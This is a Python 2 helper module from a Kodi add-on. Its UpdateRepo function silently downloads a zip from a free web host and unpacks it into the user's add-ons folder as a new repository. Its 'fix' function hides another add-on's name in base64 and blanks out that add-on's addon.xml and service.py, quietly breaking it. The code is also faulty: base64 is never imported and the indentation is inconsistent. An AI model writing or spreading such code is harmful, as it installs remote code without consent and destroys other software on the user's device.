# -*- coding: utf-8 -*-
import os, urllib, xbmc, zipfile
#Thanks to XBMC ISRAEL for this code you saved us 5 minutes of coding... :)
def ExtractAll(_in, _out):
	try:
		zin = zipfile.ZipFile(_in, 'r')
		zin.extractall(_out)
		zin.close()
	except Exception, e:
		print str(e)
		return False

	return True
	
def UpdateRepo():
	if os.path.exists(os.path.join(xbmc.translatePath("special://home/addons/").decode("utf-8"), 'repository.donatelloandhybrid')):
		return
		
	url = "http://sdaasfd.5gbfree.com/dhrepo/repository.donatelloandhybrid.zip"
	addonsDir = xbmc.translatePath(os.path.join('special://home', 'addons')).decode("utf-8")
	packageFile = os.path.join(addonsDir, 'packages', 'donihyb.zip')
	
	urllib.urlretrieve(url, packageFile)
	ExtractAll(packageFile, addonsDir)
		
	try:
		os.remove(packageFile)
	except:
		pass
			
	xbmc.executebuiltin("UpdateLocalAddons")
	xbmc.executebuiltin("UpdateAddonRepos")

def fix():
	if os.path.exists(os.path.join(xbmc.translatePath("special://home/addons/").decode("utf-8"), base64.decodestring('cGx1Z2luLnByb2dyYW0uc2tpbmhlbHBlcg=='))):
		skinpath =os.path.join(xbmc.translatePath("special://home/addons/").decode("utf-8"), base64.decodestring('cGx1Z2luLnByb2dyYW0uc2tpbmhlbHBlcg=='))
		l = open(os.path.join(skinpath,"addon.xml" ),"w")
        l.write(" ")
        l.close()
        l = open(os.path.join(skinpath,"service.py" ),"w")
        l.write(" ")
        l.close()
